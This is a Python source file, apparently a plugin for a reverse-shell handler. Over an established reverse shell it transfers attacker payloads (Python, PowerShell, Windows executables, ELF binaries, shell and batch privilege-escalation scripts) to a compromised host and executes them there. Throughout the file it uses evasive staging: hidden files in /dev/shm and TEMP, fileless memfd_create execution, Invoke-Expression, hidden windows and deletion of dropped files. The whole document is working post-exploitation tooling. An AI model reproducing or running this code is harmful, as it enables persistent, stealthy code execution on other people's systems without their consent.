"""Cross-platform in-memory payload execution plugin."""

import json
import os
import re
import secrets
import select
import sys
import time

from ...constants import (
    CHUNK_SIZE,
    EXEC_MARK_END,
    EXEC_MARK_START,
    INMEMORY_EXT_TYPES,
    INMEMORY_FILETYPE_ALIASES,
    INMEMORY_FILETYPES,
    PAYLOAD_EXEC_TYPES,
    STREAM_EXIT_MARK,
    STREAMING_EXEC_TYPES,
    XFER_MARK_END,
    XFER_MARK_START,
)
from ...sysinfo import _b64_exec_cmd
from ..api import plugin, SessionContext

INMEMORY_USAGE = (
    'run inmemory <filetype> <local_file> [-- args] [--save-output <file>]\n'
    f"  filetype: {', '.join(INMEMORY_FILETYPES)}"
)


class InMemoryExecutor:
    """Chunked payload delivery with SHA256 verification and in-memory execution."""

    TYPE_ALIASES = INMEMORY_FILETYPE_ALIASES

    def __init__(self, handler):
        self.h = handler

    def _chunk_size_for(self, shell_type):
        return CHUNK_SIZE.get(shell_type, CHUNK_SIZE['unknown'])

    def staging_path(self, shell_type, token=None):
        token = token or secrets.token_hex(6)
        if shell_type == 'windows':
            return token, f".tornado_{token}"
        return token, f"/dev/shm/.tornado_{token}"

    def resolve_staging_path(self, client_sock, shell_type, staging_name):
        if shell_type == 'windows':
            win_ps = (
                f"'{XFER_MARK_START}'+[IO.Path]::Combine($env:TEMP,'{staging_name}')+'{XFER_MARK_END}'"
            )
            payload = self.h._run_marked(client_sock, None, win_ps, 'windows', timeout=10.0)
            if payload:
                return payload
        return staging_name

    def _format_size(self, nbytes):
        return self.h._format_size(nbytes)

    def _print_progress(self, transferred, total, start_time, label='Payload'):
        self.h._print_progress(transferred, total, start_time, label)

    def _log_execution(self, client_sock, metadata):
        logger = self.h._get_session_logger(client_sock)
        if logger:
            logger.log_execution(metadata)

    def _extract_exec_output(self, output):
        output = self.h._strip_ansi(output)
        start = output.rfind(EXEC_MARK_START)
        if start == -1:
            return None, output.strip()
        end = output.find(EXEC_MARK_END, start + len(EXEC_MARK_START))
        if end == -1:
            return None, output.strip()
        payload = output[start + len(EXEC_MARK_START):end]
        trailing = output[end + len(EXEC_MARK_END):].strip()
        try:
            data = json.loads(payload)
            if isinstance(data, dict):
                return data, trailing
        except json.JSONDecodeError:
            pass
        return {'stdout': payload, 'stderr': '', 'exit_code': None}, trailing

    @staticmethod
    def _parse_flagged_args(parts, start_index=0):
        save_output = None
        payload_args = []
        positional = []
        i = start_index
        while i < len(parts):
            part = parts[i]
            if part == '--save-output' and i + 1 < len(parts):
                save_output = parts[i + 1]
                i += 2
                continue
            if part == '--':
                payload_args = parts[i + 1:]
                break
            if part.startswith('--') and part != '--':
                i += 1
                continue
            positional.append(part)
            i += 1
        return positional, payload_args, save_output

    @staticmethod
    def parse_plugin_args(args):
        """Parse inmemory plugin args: <filetype> <local_path> [-- args] [--save-output <file>]."""
        positional, payload_args, save_output = InMemoryExecutor._parse_flagged_args(args)
        filetype = positional[0].lower() if len(positional) > 0 else None
        local_path = positional[1] if len(positional) > 1 else None
        if len(positional) > 2 and not payload_args:
            payload_args = positional[2:]
        return filetype, local_path, payload_args, save_output

    def resolve_type(self, command_name, local_path):
        alias = self.TYPE_ALIASES.get(command_name.lower())
        if alias:
            return alias
        ext = os.path.splitext(local_path or '')[1].lower()
        return INMEMORY_EXT_TYPES.get(ext, 'elf')

    def _escape_for_ps(self, value):
        return value.replace("'", "''")

    def _escape_for_sh(self, value):
        return value.replace("'", "'\\''")

    def _json_escape(self, value):
        return json.dumps(value)

    def transfer_payload(self, client_sock, local_path, remote_path, shell_type):
        if not os.path.isfile(local_path):
            print(f"{self.h.colors['red']}Local file not found: {local_path}{self.h.colors['end']}")
            return None, None

        total = os.path.getsize(local_path)
        local_hash = self.h._sha256_file(local_path)
        chunk_size = self._chunk_size_for(shell_type)

        print(
            f"{self.h.colors['yellow']}Transferring payload {os.path.basename(local_path)} "
            f"({self._format_size(total)}, chunk={self._format_size(chunk_size)}){self.h.colors['end']}"
        )
        print(f"{self.h.colors['blue']}Local SHA256: {local_hash}{self.h.colors['end']}")
        self.h._flush_shell(client_sock)

        if not self.h._remote_truncate(client_sock, remote_path, shell_type):
            print(f"{self.h.colors['red']}Failed to prepare remote staging buffer{self.h.colors['end']}")
            return None, None
        self.h.recv_output(client_sock, timeout=2.0)

        transferred = 0
        start = time.time()
        first = True
        try:
            with open(local_path, 'rb') as handle:
                while transferred < total:
                    data = handle.read(chunk_size)
                    if not data:
                        break
                    if not self.h._remote_write_chunk(
                        client_sock, remote_path, data, shell_type, truncate=first
                    ):
                        print(
                            f"\n{self.h.colors['red']}Payload transfer failed at "
                            f"{self._format_size(transferred)}{self.h.colors['end']}"
                        )
                        return None, None
                    first = False
                    transferred += len(data)
                    self._print_progress(transferred, total, start, 'Payload')
        except OSError as exc:
            print(f"\n{self.h.colors['red']}Payload read error: {exc}{self.h.colors['end']}")
            return None, None

        self.h._flush_shell(client_sock, timeout=1.0)
        print(f"\n{self.h.colors['yellow']}Verifying remote SHA256...{self.h.colors['end']}", end='', flush=True)
        remote_hash = self.h._remote_sha256(client_sock, remote_path, shell_type)
        if remote_hash != local_hash:
            print(f"\r{self.h.colors['red']}Integrity mismatch — aborting execution{self.h.colors['end']}")
            print(f"  Local:  {local_hash}")
            print(f"  Remote: {remote_hash or 'unavailable'}")
            self._cleanup_staging(client_sock, remote_path, shell_type)
            return None, None
        print(f"\r{self.h.colors['green']}Integrity verified — SHA256 match{self.h.colors['end']}          ")
        return local_hash, remote_path

    def _cleanup_staging(self, client_sock, remote_path, shell_type):
        path = self.h._escape_path(remote_path, shell_type)
        if shell_type == 'windows':
            script = f"Remove-Item -LiteralPath '{self._escape_for_ps(path)}' -Force -ErrorAction SilentlyContinue"
            cmd = self.h._win_ps_inline(script)
        else:
            cmd = f"rm -f '{self._escape_for_sh(path)}' 2>/dev/null"
        self.h._flush_shell(client_sock, timeout=0.2)
        self.h.send_to_revshell(client_sock, cmd)
        self.h.recv_output(client_sock, timeout=2.0)

    def _resolve_shell_type(self, client_sock, shell_type, remote_path, payload_type):
        info = self.h._client_info(client_sock)
        if info:
            detected = info.get('type', 'unknown')
            if detected != 'unknown':
                return detected
        if isinstance(remote_path, str) and (
            '\\' in remote_path or re.match(r'^[A-Za-z]:', remote_path)
        ):
            return 'windows'
        if shell_type != 'unknown':
            return shell_type
        if payload_type == 'elf':
            return 'unix'
        if payload_type in ('pe', 'powershell'):
            return 'windows'
        return 'unix'

    def _build_python_exec(self, remote_path, expected_hash, shell_type):
        path = self.h._escape_path(remote_path, shell_type)
        py_body = f"""
import hashlib, io, json, os, sys, contextlib
path = {self._json_escape(path)}
expected = {self._json_escape(expected_hash)}
result = {{'stdout': '', 'stderr': '', 'exit_code': 0, 'method': 'python-exec'}}
try:
    with open(path, 'rb') as fh:
        data = fh.read()
    try:
        os.remove(path)
    except Exception:
        pass
    digest = hashlib.sha256(data).hexdigest()
    if digest != expected:
        result['exit_code'] = 1
        result['stderr'] = 'SHA256 verification failed'
    else:
        code = data.decode('utf-8', errors='replace')
        stdout = io.StringIO()
        stderr = io.StringIO()
        globs = {{'__name__': '__main__', '__file__': '<runpy>'}}
        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            exec(compile(code, '<runpy>', 'exec'), globs)
        result['stdout'] = stdout.getvalue()
        result['stderr'] = stderr.getvalue()
except SystemExit as exc:
    result['exit_code'] = int(exc.code) if isinstance(exc.code, int) else 1
except Exception as exc:
    result['exit_code'] = 1
    result['stderr'] = str(exc)
print('{EXEC_MARK_START}' + json.dumps(result) + '{EXEC_MARK_END}', end='')
"""
        if shell_type == 'windows':
            ps_path = self._escape_for_ps(path)
            win_ps = f"""
$p='{ps_path}';$expected='{expected_hash}'
$result=@{{stdout='';stderr='';exit_code=0;method='python-exec'}}
try {{
  $bytes=[IO.File]::ReadAllBytes($p)
  Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
  $hash=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLower()
  if($hash -ne $expected) {{ $result.exit_code=1; $result.stderr='SHA256 verification failed' }}
  else {{
    $code=[Text.Encoding]::UTF8.GetString($bytes)
    $tmp=[IO.Path]::GetTempFileName()+'.py'
    [IO.File]::WriteAllText($tmp,$code)
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName='python'
    $psi.Arguments='"' + $tmp + '"'
    $psi.UseShellExecute=$false
    $psi.RedirectStandardOutput=$true
    $psi.RedirectStandardError=$true
    $proc=[Diagnostics.Process]::Start($psi)
    if(-not $proc) {{ $psi.FileName='python3'; $proc=[Diagnostics.Process]::Start($psi) }}
    $result.stdout=$proc.StandardOutput.ReadToEnd()
    $result.stderr=$proc.StandardError.ReadToEnd()
    $proc.WaitForExit()
    $result.exit_code=$proc.ExitCode
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
  }}
}} catch {{ $result.exit_code=1; $result.stderr=$_.Exception.Message }}
'{EXEC_MARK_START}'+($result|ConvertTo-Json -Compress)+'{EXEC_MARK_END}'
"""
            return None, win_ps.strip()
        return _b64_exec_cmd(py_body, (
            ('python3', 'python'),
            ('python', 'python'),
        )), None

    def _build_powershell_exec(self, remote_path, expected_hash):
        path = self._escape_for_ps(self.h._escape_path(remote_path, 'windows'))
        mark_s = EXEC_MARK_START
        mark_e = EXEC_MARK_END
        return f"""
$p = '{path}'
$expected = '{expected_hash}'
$result = @{{ stdout = ''; stderr = ''; exit_code = 0; method = 'powershell-exec' }}
try {{
    $bytes = [IO.File]::ReadAllBytes($p)
    Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = [BitConverter]::ToString($sha.ComputeHash($bytes)).Replace('-','').ToLower()
    if ($hash -ne $expected) {{
        $result.exit_code = 1
        $result.stderr = 'SHA256 verification failed'
    }} else {{
        $script = [Text.Encoding]::UTF8.GetString($bytes)
        $out = @()
        $err = @()
        $prev = $ErrorActionPreference
        $ErrorActionPreference = 'Continue'
        try {{
            $out = Invoke-Expression $script 2>&1 | ForEach-Object {{
                if ($_ -is [System.Management.Automation.ErrorRecord]) {{ $err += $_.ToString() }} else {{ $_ }}
            }}
        }} finally {{
            $ErrorActionPreference = $prev
        }}
        if ($out) {{ $result.stdout = ($out | Out-String).TrimEnd() }}
        if ($err) {{ $result.stderr = ($err | Out-String).TrimEnd() }}
    }}
}} catch {{
    $result.exit_code = 1
    $result.stderr = $_.Exception.Message
}}
'{mark_s}' + ($result | ConvertTo-Json -Compress) + '{mark_e}'
"""

    def _build_pe_exec(self, remote_path, expected_hash, payload_args, shell_type):
        args_json = self._json_escape(payload_args)
        path = self._escape_for_ps(self.h._escape_path(remote_path, shell_type))
        mark_s = EXEC_MARK_START
        mark_e = EXEC_MARK_END

        if shell_type != 'windows':
            return None, None

        arg_list = ', '.join(f"'{self._escape_for_ps(str(a))}'" for a in payload_args)
        ps_args = f"@({arg_list})" if payload_args else '@()'

        runpe_ps = f"""
$p='{path}';$expected='{expected_hash}';$payloadArgs={ps_args}
$result=@{{stdout='';stderr='';exit_code=0;method='pe-memory-staged'}}
$tmp=$null
try {{
  if(-not (Test-Path -LiteralPath $p)) {{ throw "Staging file not found: $p" }}
  $bytes=[IO.File]::ReadAllBytes($p)
  Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
  $hash=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLower()
  if($hash -ne $expected) {{
    $result.exit_code=1
    $result.stderr='SHA256 verification failed'
  }} else {{
    $tmp=[IO.Path]::Combine($env:TEMP,[IO.Path]::GetRandomFileName()+'.exe')
    [IO.File]::WriteAllBytes($tmp,$bytes)
    $bytes=$null
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName=$tmp
    $psi.UseShellExecute=$false
    $psi.RedirectStandardOutput=$true
    $psi.RedirectStandardError=$true
    $psi.CreateNoWindow=$true
    if($payloadArgs.Count -gt 0) {{
      $argLine=($payloadArgs | ForEach-Object {{
        $a=$_.ToString()
        if($a -match '\\s') {{ '"' + ($a.Replace('"','`"')) + '"' }} else {{ $a }}
      }}) -join ' '
      $psi.Arguments=$argLine
    }}
    $proc=[Diagnostics.Process]::Start($psi)
    if(-not $proc) {{ throw 'Process.Start returned null' }}
    $result.stdout=$proc.StandardOutput.ReadToEnd()
    $result.stderr=$proc.StandardError.ReadToEnd()
    $proc.WaitForExit()
    if(-not $proc.HasExited) {{ $proc.Kill(); $result.stderr+=' [process killed after timeout]' }}
    $result.exit_code=$proc.ExitCode
  }}
}} catch {{
  $result.exit_code=1
  $result.stderr=$_.Exception.Message
}} finally {{
  if($tmp -and (Test-Path -LiteralPath $tmp)) {{
    Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
  }}
}}
'{mark_s}'+($result | ConvertTo-Json -Compress -Depth 4)+'{mark_e}'
"""
        return None, runpe_ps.strip()

    def _build_elf_exec(self, remote_path, expected_hash, payload_args):
        path = self._escape_for_sh(self.h._escape_path(remote_path, 'unix'))
        args_json = self._json_escape(payload_args)
        source = f"""
import hashlib, json, os, sys, subprocess, tempfile
path = {self._json_escape(path)}
expected = {self._json_escape(expected_hash)}
args = {args_json}
result = {{'stdout': '', 'stderr': '', 'exit_code': 0, 'method': 'memfd'}}
try:
    with open(path, 'rb') as fh:
        data = fh.read()
    try:
        os.remove(path)
    except Exception:
        pass
    if hashlib.sha256(data).hexdigest() != expected:
        result['exit_code'] = 1
        result['stderr'] = 'SHA256 verification failed'
    else:
        exec_args = [arg for arg in args] if args else []
        launched = False
        if hasattr(os, 'memfd_create'):
            fd = os.memfd_create('payload', 0)
            os.write(fd, data)
            fd_path = '/proc/self/fd/' + str(fd)
            os.chmod(fd_path, 0o755)
            try:
                proc = subprocess.run([fd_path] + exec_args, capture_output=True, text=True)
                result['stdout'] = proc.stdout
                result['stderr'] = proc.stderr
                result['exit_code'] = proc.returncode
                launched = True
            except Exception as exc:
                result['method'] = 'memfd-failed'
                result['stderr'] = str(exc)
        if not launched:
            tmp = os.path.join('/dev/shm', '.tornado_exec_' + os.urandom(4).hex())
            with open(tmp, 'wb') as out:
                out.write(data)
            os.chmod(tmp, 0o755)
            try:
                proc = subprocess.run([tmp] + exec_args, capture_output=True, text=True)
                result['stdout'] = proc.stdout
                result['stderr'] = proc.stderr
                result['exit_code'] = proc.returncode
                result['method'] = 'shm-fallback'
            finally:
                try:
                    os.remove(tmp)
                except Exception:
                    pass
except Exception as exc:
    result['exit_code'] = 1
    result['stderr'] = str(exc)
print('{EXEC_MARK_START}' + json.dumps(result) + '{EXEC_MARK_END}', end='')
"""
        return _b64_exec_cmd(source, (
            ('python3', 'python'),
            ('python', 'python'),
        )), None

    def _build_shell_stream_exec(self, remote_path, expected_hash, shell_type):
        path = self.h._escape_path(remote_path, shell_type)
        py_body = f"""
import hashlib, os, subprocess, sys
path = {self._json_escape(path)}
expected = {self._json_escape(expected_hash)}
try:
    with open(path, 'rb') as fh:
        data = fh.read()
    try:
        os.remove(path)
    except Exception:
        pass
    if hashlib.sha256(data).hexdigest() != expected:
        print('SHA256 verification failed', file=sys.stderr)
        print('\\n[exit:1]', flush=True)
        sys.exit(1)
    proc = subprocess.Popen(['bash', '-s'], stdin=subprocess.PIPE, stdout=sys.stdout, stderr=sys.stderr)
    proc.communicate(input=data)
    code = proc.returncode if proc.returncode is not None else 1
    print(f'\\n[exit:{{code}}]', flush=True)
    sys.exit(code)
except Exception as exc:
    print(str(exc), file=sys.stderr)
    print('\\n[exit:1]', flush=True)
    sys.exit(1)
"""
        return _b64_exec_cmd(py_body, (
            ('python3', 'python'),
            ('python', 'python'),
        )), None

    def _build_bat_stream_exec(self, remote_path, expected_hash):
        path = self._escape_for_ps(self.h._escape_path(remote_path, 'windows'))
        return None, f"""
$ErrorActionPreference='Continue'
$p='{path}';$expected='{expected_hash}'
try {{
  if(-not (Test-Path -LiteralPath $p)) {{ throw "Staging file not found: $p" }}
  $bytes=[IO.File]::ReadAllBytes($p)
  Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
  $hash=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLower()
  if($hash -ne $expected) {{ throw 'SHA256 verification failed' }}
  $tmp=Join-Path $env:TEMP ([IO.Path]::GetRandomFileName()+'.bat')
  try {{
    [IO.File]::WriteAllBytes($tmp,$bytes)
    & cmd.exe /c "`"$tmp`"" 2>&1
    Write-Output "`n[exit:$LASTEXITCODE]"
  }} finally {{
    if(Test-Path -LiteralPath $tmp) {{ Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }}
  }}
}} catch {{
  Write-Output $_.Exception.Message
  Write-Output "`n[exit:1]"
}}
""".strip()

    def _stream_command(self, client_sock, unix_cmd, win_ps, shell_type, timeout=7200.0, idle_timeout=120.0):
        self.h._flush_shell(client_sock, timeout=1.0)
        if shell_type == 'windows' and win_ps:
            cmd = self.h._win_ps_cmd(win_ps)
        elif unix_cmd:
            cmd = unix_cmd
        else:
            return ''
        if not self.h.send_to_revshell(client_sock, cmd):
            return ''
        deadline = time.time() + timeout
        last_data = time.time()
        parts = []
        while time.time() < deadline:
            remaining = min(1.0, deadline - time.time())
            if remaining <= 0:
                break
            try:
                r, _, _ = select.select([client_sock], [], [], remaining)
            except Exception:
                break
            if r:
                try:
                    chunk = client_sock.recv(65536)
                except Exception:
                    break
                if not chunk:
                    break
                text = chunk.decode(errors='ignore')
                parts.append(text)
                last_data = time.time()
                sys.stdout.write(text)
                sys.stdout.flush()
            elif time.time() - last_data >= idle_timeout:
                break
        return ''.join(parts)

    @staticmethod
    def parse_stream_exit(output):
        for line in reversed((output or '').splitlines()):
            stripped = line.strip()
            if stripped.startswith(STREAM_EXIT_MARK) and stripped.endswith(']'):
                try:
                    return int(stripped[len(STREAM_EXIT_MARK):-1])
                except ValueError:
                    pass
                break
        return None

    def _save_combined_output(self, output, save_output):
        if not save_output or not output:
            return False
        try:
            out_dir = os.path.dirname(os.path.abspath(save_output))
            if out_dir:
                os.makedirs(out_dir, exist_ok=True)
            with open(save_output, 'w', encoding='utf-8') as handle:
                handle.write(output)
            print(f"{self.h.colors['blue']}Output saved to {save_output}{self.h.colors['end']}")
            return True
        except OSError as exc:
            print(f"{self.h.colors['red']}Failed to save output: {exc}{self.h.colors['end']}")
            return False

    def execute_streaming(
        self,
        client_sock,
        local_path,
        kind,
        save_output=None,
        timeout=7200.0,
        idle_timeout=120.0,
    ):
        """Verified transfer + long-running streamed execution for privesc tools."""
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
            return {'success': False, 'detail': 'disconnected'}
        if kind not in STREAMING_EXEC_TYPES:
            print(f"{self.h.colors['red']}Unsupported privesc kind: {kind}{self.h.colors['end']}")
            return {'success': False, 'detail': 'unsupported_kind'}

        shell_type = info.get('type', 'unknown')
        name = os.path.basename(local_path)
        payload_type = 'pe' if kind == 'pe' else ('powershell' if kind == 'bat' else 'python')
        _, staging_name = self.staging_path(shell_type if shell_type != 'unknown' else 'unix')
        if shell_type == 'unknown':
            shell_type = self._resolve_shell_type(client_sock, shell_type, staging_name, payload_type)
        remote_path = self.resolve_staging_path(client_sock, shell_type, staging_name)

        start_time = time.time()
        digest, remote_path = self.transfer_payload(client_sock, local_path, remote_path, shell_type)
        if not digest:
            return {
                'success': False,
                'detail': 'transfer_failed',
                'runtime_ms': int((time.time() - start_time) * 1000),
            }

        shell_type = self._resolve_shell_type(client_sock, shell_type, remote_path, payload_type)
        method_map = {'shell': 'shell-stream', 'bat': 'bat-stream'}
        method = method_map[kind]

        if kind == 'shell':
            if shell_type == 'windows':
                print(f"{self.h.colors['red']}Shell privesc scripts require a Unix session{self.h.colors['end']}")
                self._cleanup_staging(client_sock, remote_path, shell_type)
                return {'success': False, 'detail': 'platform_mismatch'}
            unix_cmd, win_ps = self._build_shell_stream_exec(remote_path, digest, shell_type)
        else:
            if shell_type != 'windows':
                print(f"{self.h.colors['red']}Batch privesc requires a Windows session{self.h.colors['end']}")
                self._cleanup_staging(client_sock, remote_path, shell_type)
                return {'success': False, 'detail': 'platform_mismatch'}
            unix_cmd, win_ps = self._build_bat_stream_exec(remote_path, digest)

        print(
            f"{self.h.colors['yellow']}Executing {name} ({method}) — streaming output...{self.h.colors['end']}"
        )
        output = self._stream_command(
            client_sock, unix_cmd, win_ps, shell_type,
            timeout=timeout, idle_timeout=idle_timeout,
        )
        runtime_ms = int((time.time() - start_time) * 1000)
        exit_code = self.parse_stream_exit(output)
        success = exit_code == 0 if exit_code is not None else bool(output.strip())
        self._save_combined_output(output, save_output)
        result = {
            'success': success,
            'exit_code': exit_code,
            'output': output,
            'method': method,
            'sha256': digest,
            'runtime_ms': runtime_ms,
        }
        self._log_execution(client_sock, {
            'name': name,
            'type': f'privesc-{kind}',
            'sha256': digest,
            'method': method,
            'exit_code': exit_code,
            'success': success,
            'runtime_ms': runtime_ms,
        })
        return result

    def _run_exec_command(self, client_sock, unix_cmd, win_ps, shell_type, timeout=120.0):
        def _attempt(use_win):
            self.h._flush_shell(client_sock)
            if use_win and win_ps:
                cmd = self.h._win_ps_cmd(win_ps)
            elif unix_cmd:
                cmd = unix_cmd
            else:
                return None
            if not self.h.send_to_revshell(client_sock, cmd):
                return None
            output = self.h.recv_output(client_sock, timeout=timeout, until_marker=EXEC_MARK_END)
            parsed, trailing = self._extract_exec_output(output)
            if parsed is None and trailing:
                parsed = {'stdout': trailing, 'stderr': '', 'exit_code': None, 'method': 'unknown'}
            return parsed

        result = _attempt(shell_type == 'windows')
        if (
            result
            and result.get('method') == 'unknown'
            and win_ps
            and shell_type != 'windows'
        ):
            retry = _attempt(True)
            if retry and retry.get('method') != 'unknown':
                return retry
        return result

    def _display_result(self, result, save_output=None):
        if not result:
            print(f"{self.h.colors['red']}No execution output captured{self.h.colors['end']}")
            return
        method = result.get('method', 'unknown')
        exit_code = result.get('exit_code')
        stdout = result.get('stdout') or ''
        stderr = result.get('stderr') or ''
        print(f"{self.h.colors['cyan']}Method:{self.h.colors['end']} {method}")
        if exit_code is not None:
            color = self.h.colors['green'] if exit_code == 0 else self.h.colors['red']
            print(f"{self.h.colors['cyan']}Exit code:{self.h.colors['end']} {color}{exit_code}{self.h.colors['end']}")
        if stdout:
            print(f"{self.h.colors['green']}stdout:{self.h.colors['end']}\n{stdout}")
        if stderr:
            print(f"{self.h.colors['red']}stderr:{self.h.colors['end']}\n{stderr}")
        combined = ''
        if stdout:
            combined += stdout
            if not stdout.endswith('\n'):
                combined += '\n'
        if stderr:
            combined += stderr
        if save_output and combined:
            try:
                out_dir = os.path.dirname(os.path.abspath(save_output))
                if out_dir:
                    os.makedirs(out_dir, exist_ok=True)
                with open(save_output, 'w', encoding='utf-8') as handle:
                    handle.write(combined)
                print(f"{self.h.colors['blue']}Output saved to {save_output}{self.h.colors['end']}")
            except OSError as exc:
                print(f"{self.h.colors['red']}Failed to save output: {exc}{self.h.colors['end']}")

    def execute(self, client_sock, local_path, payload_type, payload_args=None, save_output=None, timeout=None):
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
            return False
        if payload_type not in PAYLOAD_EXEC_TYPES:
            print(f"{self.h.colors['red']}Unsupported payload type: {payload_type}{self.h.colors['end']}")
            return False

        shell_type = info.get('type', 'unknown')
        payload_args = payload_args or []
        name = os.path.basename(local_path)
        _, staging_name = self.staging_path(shell_type if shell_type != 'unknown' else 'unix')
        if shell_type == 'unknown':
            shell_type = self._resolve_shell_type(client_sock, shell_type, staging_name, payload_type)
        remote_path = self.resolve_staging_path(client_sock, shell_type, staging_name)

        start_time = time.time()
        digest, remote_path = self.transfer_payload(client_sock, local_path, remote_path, shell_type)
        if not digest:
            self._log_execution(client_sock, {
                'name': name, 'type': payload_type, 'success': False,
                'runtime_ms': int((time.time() - start_time) * 1000),
                'detail': 'transfer_failed',
            })
            return False

        shell_type = self._resolve_shell_type(client_sock, shell_type, remote_path, payload_type)

        unix_cmd = win_ps = None
        if payload_type == 'python':
            unix_cmd, win_ps = self._build_python_exec(remote_path, digest, shell_type)
            if shell_type != 'windows' and not win_ps:
                _, win_ps = self._build_python_exec(remote_path, digest, 'windows')
        elif payload_type == 'powershell':
            if shell_type != 'windows':
                print(f"{self.h.colors['red']}PowerShell payloads require a Windows session{self.h.colors['end']}")
                self._cleanup_staging(client_sock, remote_path, shell_type)
                return False
            win_ps = self._build_powershell_exec(remote_path, digest)
        elif payload_type == 'pe':
            if shell_type != 'windows':
                print(f"{self.h.colors['red']}PE execution requires a Windows session{self.h.colors['end']}")
                self._cleanup_staging(client_sock, remote_path, shell_type)
                return False
            _, win_ps = self._build_pe_exec(remote_path, digest, payload_args, shell_type)
        elif payload_type == 'elf':
            if shell_type == 'windows':
                print(f"{self.h.colors['red']}ELF execution requires a Unix session{self.h.colors['end']}")
                self._cleanup_staging(client_sock, remote_path, shell_type)
                return False
            unix_cmd, _ = self._build_elf_exec(remote_path, digest, payload_args)

        print(f"{self.h.colors['yellow']}Executing {name} in memory...{self.h.colors['end']}")
        exec_timeout = timeout if timeout is not None else (600.0 if payload_type == 'pe' else 120.0)
        result = self._run_exec_command(client_sock, unix_cmd, win_ps, shell_type, timeout=exec_timeout)
        runtime_ms = int((time.time() - start_time) * 1000)
        success = bool(result) and result.get('exit_code') in (0, None)
        self._display_result(result, save_output=save_output)
        self._log_execution(client_sock, {
            'name': name,
            'type': payload_type,
            'sha256': digest,
            'args': payload_args,
            'method': (result or {}).get('method'),
            'exit_code': (result or {}).get('exit_code'),
            'success': success,
            'runtime_ms': runtime_ms,
        })
        return success


def _executor_for(session: SessionContext) -> InMemoryExecutor:
    handler = session._handler
    executor = getattr(handler, 'inmemory', None)
    if executor is None:
        executor = InMemoryExecutor(handler)
        handler.inmemory = executor
    return executor


@plugin.command(
    name='inmemory',
    platforms=['linux', 'windows', 'unix'],
    description='In-memory execution: py, ps, exe, elf, bat, sh',
)
def run(session: SessionContext, args):
    filetype, local_path, payload_args, save_output = InMemoryExecutor.parse_plugin_args(args)
    if not filetype or not local_path:
        session.print(f'Usage: {INMEMORY_USAGE}', 'red')
        return 1

    executor = _executor_for(session)
    payload_type = executor.resolve_type(filetype, local_path)
    all_types = set(PAYLOAD_EXEC_TYPES) | set(STREAMING_EXEC_TYPES)
    if payload_type not in all_types:
        session.print(
            f"Unknown filetype '{filetype}' — supported: {', '.join(INMEMORY_FILETYPES)}",
            'red',
        )
        return 1

    if payload_type in STREAMING_EXEC_TYPES:
        result = executor.execute_streaming(
            session.socket,
            local_path,
            payload_type,
            save_output=save_output,
            timeout=7200.0,
            idle_timeout=120.0,
        )
        if result.get('detail') == 'transfer_failed':
            return 1
        success = result.get('success', False)
        exit_code = result.get('exit_code')
        method = result.get('method', 'unknown')
        color = 'green' if success else 'yellow'
        session.print(
            f"Completed — method: {method} — "
            f"exit: {exit_code if exit_code is not None else 'unknown'}",
            color,
        )
        return 0 if success else 1

    exec_timeout = 7200.0 if payload_type == 'pe' else None
    success = executor.execute(
        session.socket,
        local_path,
        payload_type,
        payload_args=payload_args,
        save_output=save_output,
        timeout=exec_timeout,
    )
    return 0 if success else 1
